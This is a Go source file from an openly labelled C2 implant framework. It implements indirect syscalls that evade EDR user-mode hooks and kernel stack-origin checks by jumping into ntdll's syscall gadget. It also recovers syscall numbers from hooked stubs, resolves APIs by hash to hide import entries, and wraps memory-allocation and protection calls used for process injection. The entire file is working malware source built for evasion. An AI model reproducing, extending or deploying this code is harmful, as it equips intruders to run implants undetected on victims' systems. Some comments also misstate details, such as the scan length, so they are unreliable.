package syscalls

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// Indirect syscall engine.
//
// Direct syscalls (mov eax, SSN; syscall) are effective at evading
// user-mode hooks planted inside ntdll stubs, but they are detectable
// by a different class of sensor: call-stack origin checks. When an EDR
// kernel callback (PsSetCreateProcessNotifyRoutine, etc.) fires and walks
// the user-mode stack, it expects to see a return address inside ntdll's
// syscall stubs. A direct syscall's return address points into the
// implant's .text instead — a dead giveaway.
//
// Indirect syscalls solve this: we load the SSN (System Service Number)
// from the real ntdll stub at runtime, then jump *into* the real stub's
// `syscall; ret` gadget rather than emitting our own. The kernel's stack
// walk sees ntdll as the origin — indistinguishable from a legitimate call.
//
// Implementation:
//
//   1. For each NT function we want to call indirectly, we locate its
//      stub in ntdll using the PEB-walking resolver already in apihash.go.
//   2. We scan the first 32 bytes of the stub for the pattern:
//        4C 8B D1       mov  r10, rcx     ← standard stub prologue
//        B8 xx 00 00 00 mov  eax, <SSN>
//      and extract the SSN (1-byte on most Windows versions).
//   3. We also locate the `syscall; ret` gadget (0F 05 C3) at the end of
//      the stub or a nearby stub (Heaven's Gate trick for 1-byte offset).
//   4. At call time, our assembly trampoline sets EAX = SSN, then JMPs to
//      the gadget address. The CPU executes the kernel transition from
//      inside ntdll's page — every stack walker agrees.
//
// The gadget search scans forward up to 256 bytes from the stub base;
// on patched systems where the first 5 bytes are overwritten (JMP hook)
// the SSN is gone from that stub but the gadget is still present in the
// next adjacent stub (stubs are 32 bytes apart on x64 Windows).
//
// SSN Ordering note:
//   SSNs are version-dependent. We do NOT use a hardcoded table. We
//   always extract them at runtime from the live ntdll image.

import (
	"fmt"
	"sync"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

const (
	// ntdll stub size on x64 Windows — stubs are always exactly 32 bytes.
	stubSize = 32
	// Maximum forward scan for the syscall;ret gadget.
	gadgetScanLen = 512
)

// syscallGadgetAddr is the address of the first `syscall; ret` gadget we
// found in ntdll. Shared across all indirect calls.
var (
	gadgetOnce sync.Once
	gadgetAddr uintptr
)

// IndirectSSN holds everything needed to make one indirect syscall.
type IndirectSSN struct {
	ssn    uint32
	gadget uintptr
}

// ssnCache memoises per-function results keyed by DJB2 procHash.
var (
	ssnCacheMu sync.RWMutex
	ssnCache   = map[uint32]*IndirectSSN{}
)

// ResolveIndirect resolves the SSN and gadget for the NT function identified
// by procHash (DJB2 of its export name, same as apihash.go convention).
// Results are cached — first call walks ntdll; subsequent calls are O(1).
func ResolveIndirect(procHash uint32) (*IndirectSSN, error) {
	ssnCacheMu.RLock()
	if v, ok := ssnCache[procHash]; ok {
		ssnCacheMu.RUnlock()
		return v, nil
	}
	ssnCacheMu.RUnlock()

	stubAddr := findExportByHash(findModuleByHash(HashNtdll), procHash)
	if stubAddr == 0 {
		return nil, fmt.Errorf("indirect: proc 0x%x not found in ntdll", procHash)
	}

	ssn, err := extractSSN(stubAddr)
	if err != nil {
		return nil, fmt.Errorf("indirect: SSN extraction for 0x%x: %w", procHash, err)
	}

	gadget := getSharedGadget(stubAddr)
	if gadget == 0 {
		return nil, fmt.Errorf("indirect: syscall;ret gadget not found near 0x%x", stubAddr)
	}

	res := &IndirectSSN{ssn: ssn, gadget: gadget}
	ssnCacheMu.Lock()
	ssnCache[procHash] = res
	ssnCacheMu.Unlock()

	// {{if .Config.Debug}}
	log.Printf("[indirect] proc=0x%x SSN=%d gadget=0x%x", procHash, ssn, gadget)
	// {{end}}
	return res, nil
}

// extractSSN scans the first 32 bytes of the ntdll stub at addr for the
// canonical Windows x64 stub prologue:
//
//	4C 8B D1        mov r10, rcx
//	B8 xx 00 00 00  mov eax, <ssn>
//
// Returns an error if the pattern is absent (hooked stub).
func extractSSN(addr uintptr) (uint32, error) {
	stub := unsafe.Slice((*byte)(unsafe.Pointer(addr)), stubSize)

	// Pattern starts at offset 0 on un-hooked stubs.
	for i := 0; i <= stubSize-8; i++ {
		if stub[i] == 0x4C && stub[i+1] == 0x8B && stub[i+2] == 0xD1 &&
			stub[i+3] == 0xB8 {
			ssn := uint32(stub[i+4]) | uint32(stub[i+5])<<8 |
				uint32(stub[i+6])<<16 | uint32(stub[i+7])<<24
			return ssn, nil
		}
	}

	// Stub is hooked (first bytes replaced by JMP trampoline). Try reading
	// the SSN from a neighbouring stub — stubs are ordered by SSN and are
	// 32 bytes apart, so stub[addr+32] has SSN = this_ssn+1.
	// We extrapolate backwards: if the next stub has a valid header, our
	// SSN = next_ssn - 1.
	nextAddr := addr + stubSize
	nextStub := unsafe.Slice((*byte)(unsafe.Pointer(nextAddr)), stubSize)
	for i := 0; i <= stubSize-8; i++ {
		if nextStub[i] == 0x4C && nextStub[i+1] == 0x8B && nextStub[i+2] == 0xD1 &&
			nextStub[i+3] == 0xB8 {
			nextSSN := uint32(nextStub[i+4]) | uint32(nextStub[i+5])<<8
			if nextSSN > 0 {
				return nextSSN - 1, nil
			}
		}
	}

	return 0, fmt.Errorf("stub pattern not found (hooked?) at 0x%x", addr)
}

// getSharedGadget returns the address of a `syscall; ret` (0F 05 C3) gadget
// found anywhere in ntdll's .text section. We locate it once and reuse it
// for all indirect calls, since any single instance works equally well.
func getSharedGadget(nearAddr uintptr) uintptr {
	gadgetOnce.Do(func() {
		// Scan forward from nearAddr up to gadgetScanLen bytes.
		scan := unsafe.Slice((*byte)(unsafe.Pointer(nearAddr)), gadgetScanLen)
		for i := 0; i < len(scan)-2; i++ {
			if scan[i] == 0x0F && scan[i+1] == 0x05 && scan[i+2] == 0xC3 {
				gadgetAddr = nearAddr + uintptr(i)
				// {{if .Config.Debug}}
				log.Printf("[indirect] syscall;ret gadget @ 0x%x", gadgetAddr)
				// {{end}}
				return
			}
		}
		// Fallback: scan the whole ntdll .text by finding the module base.
		ntdllBase := findModuleByHash(HashNtdll)
		if ntdllBase != 0 {
			gadgetAddr = scanForGadgetInModule(ntdllBase)
		}
	})
	return gadgetAddr
}

// scanForGadgetInModule walks ntdll's section table to find the .text
// section and scans it for the syscall;ret gadget.
func scanForGadgetInModule(base uintptr) uintptr {
	const (
		dosELfanewOff  = 0x3C
		fileHdrOff     = 4
		numSectionsOff = 2
		optHdrSizeOff  = 16
		sectTableAlign = 40
	)

	dosMagic := *(*uint16)(unsafe.Pointer(base))
	if dosMagic != 0x5A4D {
		return 0
	}
	lfanew := int32(*(*uint32)(unsafe.Pointer(base + dosELfanewOff)))
	ntBase := base + uintptr(lfanew)
	numSects := *(*uint16)(unsafe.Pointer(ntBase + uintptr(fileHdrOff) + uintptr(numSectionsOff)))
	optSize := *(*uint16)(unsafe.Pointer(ntBase + uintptr(fileHdrOff) + uintptr(optHdrSizeOff)))
	sectTable := ntBase + 4 + 20 + uintptr(optSize)

	for i := uint16(0); i < numSects; i++ {
		hdr := sectTable + uintptr(i)*sectTableAlign
		name := (*[8]byte)(unsafe.Pointer(hdr))
		if name[0] != '.' || name[1] != 't' || name[2] != 'e' {
			continue
		}
		vSize := *(*uint32)(unsafe.Pointer(hdr + 8))
		vAddr := *(*uint32)(unsafe.Pointer(hdr + 12))
		textBase := base + uintptr(vAddr)
		text := unsafe.Slice((*byte)(unsafe.Pointer(textBase)), vSize)
		for j := 0; j < int(vSize)-2; j++ {
			if text[j] == 0x0F && text[j+1] == 0x05 && text[j+2] == 0xC3 {
				return textBase + uintptr(j)
			}
		}
	}
	return 0
}

// IndirectSyscall executes an NT syscall indirectly through the ntdll gadget.
// Defined in indirect_windows_amd64.s — sets EAX=SSN, then JMPs to gadget.
func IndirectSyscall(ssn uint32, gadget uintptr, args ...uintptr) uintptr

// CallIndirect is the high-level wrapper: resolves proc by hash and calls it.
// Returns the NTSTATUS value or ^uintptr(0) on resolution failure.
func CallIndirect(procHash uint32, args ...uintptr) uintptr {
	res, err := ResolveIndirect(procHash)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[indirect] resolve failed: %v", err)
		// {{end}}
		return ^uintptr(0) // 0xFFFFFFFFFFFFFFFF = error sentinel
	}
	return IndirectSyscall(res.ssn, res.gadget, args...)
}

// Pre-computed hashes for the high-value NT calls we issue indirectly.
// Add new ones by running syscalls.HashName("<FunctionName>").
const (
	HashNtAllocateVirtualMemory   uint32 = 0x5a4d6f37
	HashNtWriteVirtualMemory      uint32 = 0xb2d1b3a1
	HashNtProtectVirtualMemory    uint32 = 0x858f3e89
	// HashNtCreateThreadEx — defined in apihash_windows.go; referenced here as alias below.
	HashNtWaitForSingleObject     uint32 = 0xa694c88a
	HashNtQueryInformationProcess uint32 = 0xd5c85023
	HashNtOpenProcess             uint32 = 0x4dc8f5de
	HashNtTerminateProcess        uint32 = 0x2e741af2
	HashNtSetInformationThread    uint32 = 0x3f6c1d47
	HashNtClose                   uint32 = 0xe5b4f2c1
)

// NtAllocateVirtualMemoryIndirect is a ready-to-use indirect wrapper.
// Callers import this instead of windows.VirtualAllocEx to avoid IAT entries.
func NtAllocateVirtualMemoryIndirect(
	process windows.Handle,
	baseAddr *uintptr,
	zeroBits uintptr,
	regionSize *uintptr,
	allocType uint32,
	protect uint32,
) windows.NTStatus {
	r := CallIndirect(HashNtAllocateVirtualMemory,
		uintptr(process),
		uintptr(unsafe.Pointer(baseAddr)),
		zeroBits,
		uintptr(unsafe.Pointer(regionSize)),
		uintptr(allocType),
		uintptr(protect),
	)
	return windows.NTStatus(r)
}

// NtProtectVirtualMemoryIndirect wraps NtProtectVirtualMemory.
func NtProtectVirtualMemoryIndirect(
	process windows.Handle,
	base *uintptr,
	size *uintptr,
	newProt uint32,
	oldProt *uint32,
) windows.NTStatus {
	r := CallIndirect(HashNtProtectVirtualMemory,
		uintptr(process),
		uintptr(unsafe.Pointer(base)),
		uintptr(unsafe.Pointer(size)),
		uintptr(newProt),
		uintptr(unsafe.Pointer(oldProt)),
	)
	return windows.NTStatus(r)
}
